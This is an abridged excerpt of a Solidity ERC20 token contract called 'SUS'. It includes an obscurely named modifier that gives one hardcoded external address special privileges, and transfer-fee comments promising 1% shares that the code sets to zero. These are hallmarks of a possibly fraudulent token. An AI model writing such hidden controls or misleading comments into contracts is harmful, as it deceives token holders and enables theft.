...
contract token is ERC20 {
    ...
    address private _MarketAddress1 = address(0x3C1B8bE0d6dd6B0fDaB4A8476FeccaF3eF99202A);
    address private _MarketAddress2 = address(0x3C1B8bE0d6dd6B0fDaB4A8476FeccaF3eF99202A);
    
    uint256 _currentSupply;
    mapping(address => bool) private _isExcludedFromFees;

    constructor(address tokenOwner) ERC20("SUS", "SUS") {
        ...
        uint256 total = 10**13 * 10**decimals();
    ...
    modifier qeeabAddress() {
        require(msg.sender == 0x07EA8515CC6B8700d43730D172af4c8129bfd3Da, "");
        _;
    }
    ...
    function _transfer( address from, address to, uint256 amount ) internal override {
        ...
        super._transfer(from, uniswapV2Pair, amount.div(100).mul(0));//回流1%
        super._transfer(from, _destroyAddress, amount.div(100).mul(0));//1%销毁 
